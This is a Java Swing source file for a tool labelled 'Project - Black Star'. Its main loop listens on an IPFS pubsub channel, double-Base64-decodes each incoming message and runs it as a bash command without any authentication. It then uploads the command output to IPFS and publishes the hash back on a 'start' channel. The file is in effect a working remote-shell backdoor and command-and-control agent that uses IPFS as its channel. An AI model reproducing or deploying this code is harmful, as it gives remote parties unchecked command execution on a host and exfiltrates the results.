package ipfs_shell_control;

import io.ipfs.api.IPFS;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.util.Base64;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Stream;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author toor
 */
public class ipfs_allow_shell extends javax.swing.JFrame implements Runnable {

    /**
     * Creates new form test123
     */
    IPFS ipfs = new IPFS("/ip4/127.0.0.1/tcp/5001");
    

    public ipfs_allow_shell() {
        th1 = new Thread(this);
 
        initComponents();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        out_console = new javax.swing.JTextArea();
        start = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();
        topic_set = new javax.swing.JTextField();
        set_tpc = new javax.swing.JButton();
        jLabel2 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        out_console.setColumns(20);
        out_console.setRows(5);
        jScrollPane1.setViewportView(out_console);
        out_console.setVisible(false);

        start.setText("Start");
        start.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                startActionPerformed(evt);
            }
        });

        jLabel1.setText("Project - Black Star ");

        set_tpc.setText("Set");
        set_tpc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                set_tpcActionPerformed(evt);
            }
        });

        jLabel2.setText("Channel:");

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addGap(0, 0, Short.MAX_VALUE)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 0, javax.swing.GroupLayout.PREFERRED_SIZE))
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGap(26, 26, 26)
                .addComponent(jLabel2)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(topic_set, javax.swing.GroupLayout.PREFERRED_SIZE, 233, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(set_tpc, javax.swing.GroupLayout.DEFAULT_SIZE, 81, Short.MAX_VALUE))
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(136, 136, 136)
                        .addComponent(jLabel1))
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(139, 139, 139)
                        .addComponent(start, javax.swing.GroupLayout.PREFERRED_SIZE, 130, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 1, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel1)
                .addGap(34, 34, 34)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(topic_set, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(set_tpc)
                    .addComponent(jLabel2))
                .addGap(33, 33, 33)
                .addComponent(start)
                .addContainerGap(35, Short.MAX_VALUE))
        );

        start.setVisible(false);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void startActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_startActionPerformed
        // TODO add your handling code here:
        run();
    }//GEN-LAST:event_startActionPerformed

    private void set_tpcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_set_tpcActionPerformed
        // TODO add your handling code here:        
        set_tpc.setEnabled(false);
        topic_set.setEnabled(false);
        start.setVisible(true);
     //   ipfs_chat conn_ipfs_chat = new ipfs_chat();
    //    conn_ipfs_chat.setVisible(true);
    }//GEN-LAST:event_set_tpcActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(ipfs_allow_shell.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(ipfs_allow_shell.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(ipfs_allow_shell.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(ipfs_allow_shell.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new ipfs_allow_shell().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea out_console;
    private javax.swing.JButton set_tpc;
    private javax.swing.JButton start;
    private javax.swing.JTextField topic_set;
    // End of variables declaration//GEN-END:variables

    public Thread th1;

    public void run() {
        try {
            while (true) {
                       
                out_console.setText("");
                Object sub1 = ipfs.pubsub.sub(topic_set.getText());
                Stream<Map<String, Object>> sub2 = (Stream<Map<String, Object>>) sub1;
                Object first = sub2.findAny();
                String sub3 = "" + first;
                String sub4[] = sub3.split(",");
                String data = sub4[1].substring(6, sub4[1].length());
                Base64.Decoder decoder = Base64.getDecoder();
                String dStr = new String(decoder.decode(data));
                String redStr = new String(decoder.decode(dStr));

                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command("bash", "-c", redStr);
                Process process = processBuilder.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                String a = null;

                while ((line = reader.readLine()) != null) {
                    out_console.append(line + "\n");
                }

                reader.close();
                File file1 = new File("Data.txt");
                FileWriter fileWriter = new FileWriter(file1);
                fileWriter.write(out_console.getText());
                fileWriter.flush();
                fileWriter.close();

                Process p1 = Runtime.getRuntime().exec("ipfs add " + "Data.txt");
                BufferedReader in1 = new BufferedReader(new InputStreamReader(p1.getInputStream()));
                String line1 = null;
                while ((line1 = in1.readLine()) != null) {
                    a = line1;
                }

                in1.close();
                String inp2[] = a.split(" ");
                String send_to_node = inp2[1];
                String padding1 = "<";
                String padding2 = ">";
                send_to_node = padding1 + send_to_node + padding2;
                ipfs.pubsub.pub("start", send_to_node);

            }
        } catch (Exception ex) {
            Logger.getLogger(ipfs_allow_shell.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

}
